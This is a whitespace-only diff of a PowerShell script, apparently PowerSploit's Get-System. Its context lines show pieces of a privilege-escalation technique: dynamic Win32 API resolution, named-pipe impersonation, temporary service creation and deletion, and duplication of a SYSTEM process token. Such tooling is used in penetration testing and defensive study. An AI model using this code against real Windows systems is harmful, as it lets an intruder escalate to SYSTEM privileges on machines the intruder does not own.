@@ -111,11 +111,11 @@ http://clymb3r.wordpress.com/2013/11/03/powershell-and-token-impersonation/
         Param
         (
             [OutputType([Type])]
-            
+
             [Parameter( Position = 0)]
             [Type[]]
             $Parameters = (New-Object Type[](0)),
-            
+
             [Parameter( Position = 1 )]
             [Type]
             $ReturnType = [Void]
@@ -130,7 +130,7 @@ http://clymb3r.wordpress.com/2013/11/03/powershell-and-token-impersonation/
         $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
         $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
         $MethodBuilder.SetImplementationFlags('Runtime, Managed')
-        
+
         Write-Output $TypeBuilder.CreateType()
     }
 
@@ -140,11 +140,11 @@ http://clymb3r.wordpress.com/2013/11/03/powershell-and-token-impersonation/
         Param
         (
             [OutputType([IntPtr])]
-        
+
             [Parameter( Position = 0, Mandatory = $True )]
             [String]
             $Module,
-            
+
             [Parameter( Position = 1, Mandatory = $True )]
             [String]
             $Procedure
@@ -161,7 +161,7 @@ http://clymb3r.wordpress.com/2013/11/03/powershell-and-token-impersonation/
         $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
         $tmpPtr = New-Object IntPtr
         $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
-        
+
         # Return the address of the function
         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
     }
@@ -190,7 +190,7 @@ http://clymb3r.wordpress.com/2013/11/03/powershell-and-token-impersonation/
         $PipeHandle = $Pipe.SafePipeHandle.DangerousGetHandle()
 
         # Declare/setup all the needed API function
-        #   adapted heavily from http://www.exploit-monday.com/2012/05/accessing-native-windows-api-in.html 
+        #   adapted heavily from http://www.exploit-monday.com/2012/05/accessing-native-windows-api-in.html
         $ImpersonateNamedPipeClientAddr = Get-ProcAddress Advapi32.dll ImpersonateNamedPipeClient
         $ImpersonateNamedPipeClientDelegate = Get-DelegateType @( [Int] ) ([Int])
         $ImpersonateNamedPipeClient = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateNamedPipeClientAddr, $ImpersonateNamedPipeClientDelegate)
@@ -202,11 +202,11 @@ http://clymb3r.wordpress.com/2013/11/03/powershell-and-token-impersonation/
         $OpenSCManagerAAddr = Get-ProcAddress Advapi32.dll OpenSCManagerA
         $OpenSCManagerADelegate = Get-DelegateType @( [String], [String], [Int]) ([IntPtr])
         $OpenSCManagerA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenSCManagerAAddr, $OpenSCManagerADelegate)
-        
+
         $OpenServiceAAddr = Get-ProcAddress Advapi32.dll OpenServiceA
         $OpenServiceADelegate = Get-DelegateType @( [IntPtr], [String], [Int]) ([IntPtr])
         $OpenServiceA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenServiceAAddr, $OpenServiceADelegate)
-      
+
         $CreateServiceAAddr = Get-ProcAddress Advapi32.dll CreateServiceA
         $CreateServiceADelegate = Get-DelegateType @( [IntPtr], [String], [String], [Int], [Int], [Int], [Int], [String], [String], [Int], [Int], [Int], [Int]) ([IntPtr])
         $CreateServiceA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateServiceAAddr, $CreateServiceADelegate)
@@ -298,8 +298,8 @@ http://clymb3r.wordpress.com/2013/11/03/powershell-and-token-impersonation/
                     else{
                         Write-Verbose '[Get-System] Service successfully deleted'
                     }
-                
-                    # Step 7 - CloseServiceHandle() for the service handle 
+
+                    # Step 7 - CloseServiceHandle() for the service handle
                     Write-Verbose '[Get-System] Closing the service handle'
                     $val = $CloseServiceHandle.Invoke($ServiceHandle)
                     Write-Verbose '[Get-System] Service handle closed off'
@@ -458,7 +458,7 @@ http://clymb3r.wordpress.com/2013/11/03/powershell-and-token-impersonation/
             @([IntPtr], [Bool], $TokPriv1LuidStruct.MakeByRefType(),[Int32], [IntPtr], [IntPtr]),
             [Runtime.InteropServices.CallingConvention]::Winapi,
             'Auto').SetCustomAttribute($AttribBuilder)
-        
+
         $Win32Methods = $Win32TypeBuilder.CreateType()
 
         $Win32Native = [Int32].Assembly.GetTypes() | Where-Object {$_.Name -eq 'Win32Native'}
@@ -466,7 +466,7 @@ http://clymb3r.wordpress.com/2013/11/03/powershell-and-token-impersonation/
             'GetCurrentProcess',
             [Reflection.BindingFlags] 'NonPublic, Static'
         )
-            
+
         $SE_PRIVILEGE_ENABLED = 0x00000002
         $STANDARD_RIGHTS_REQUIRED = 0x000F0000
         # $STANDARD_RIGHTS_READ = 0x00020000
@@ -509,7 +509,7 @@ http://clymb3r.wordpress.com/2013/11/03/powershell-and-token-impersonation/
         if(-not($RetVal)) {
             Write-Error "[Get-System] AdjustTokenPrivileges failed, RetVal : $RetVal" -ErrorAction Stop
         }
-        
+
         $LocalSystemNTAccount = (New-Object -TypeName 'System.Security.Principal.SecurityIdentifier' -ArgumentList ([Security.Principal.WellKnownSidType]::'LocalSystemSid', $null)).Translate([Security.Principal.NTAccount]).Value
 
         $SystemHandle = Get-WmiObject -Class Win32_Process | ForEach-Object {
@@ -532,10 +532,10 @@ http://clymb3r.wordpress.com/2013/11/03/powershell-and-token-impersonation/
                 Write-Verbose "[Get-System] error enumerating handle: $_"
             }
         } | Where-Object {$_ -and ($_ -ne 0)} | Select-Object -First 1
-        
+
         if ((-not $SystemHandle) -or ($SystemHandle -eq 0)) {
             Write-Error '[Get-System] Unable to obtain a handle to a system process.'
-        } 
+        }
         else {
             [IntPtr]$SystemToken = [IntPtr]::Zero
             $RetVal = $Win32Methods::OpenProcessToken(([IntPtr][Int] $SystemHandle), ($TOKEN_IMPERSONATE -bor $TOKEN_DUPLICATE), [ref]$SystemToken);$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()
